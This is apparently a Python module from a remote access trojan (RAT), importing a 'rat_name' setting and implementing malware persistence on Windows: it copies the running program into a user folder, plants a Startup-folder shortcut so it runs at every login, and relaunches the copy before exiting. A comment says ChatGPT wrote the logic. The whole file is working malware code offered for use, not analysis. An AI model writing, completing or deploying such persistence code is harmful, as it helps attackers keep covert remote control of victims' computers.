import os
import shutil
import sys
import ctypes
import pythoncom
from win32com.shell import shell
import subprocess
from config import rat_name

### I didnt feel like to do it and so I had chatgpt do the logic for me

def add_to_startup(target_path):
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shortcut_path = os.path.join(startup_folder, f"{rat_name}.lnk")

    shortcut = pythoncom.CoCreateInstance(
            shell.CLSID_ShellLink, None,
            pythoncom.CLSCTX_INPROC_SERVER, shell.IID_IShellLink
        )
    shortcut.SetPath(target_path)
    shortcut.SetDescription(f"Shortcut to {rat_name}")

    persist_file = shortcut.QueryInterface(pythoncom.IID_IPersistFile)
    persist_file.Save(shortcut_path, 0)

def copy_to_user_folder():
    user_folder = os.path.join("C:\\", "Users", "user")
    target_path = os.path.join(user_folder, os.path.basename(sys.argv[0]))

    try:
        if not os.path.exists(user_folder):
            os.makedirs(user_folder)
        shutil.copy2(sys.argv[0], target_path)
        
        return target_path
    except Exception as e:
        
        return None

def self_delete_and_run(target_path):
    subprocess.Popen([sys.executable, target_path])


    os._exit(0)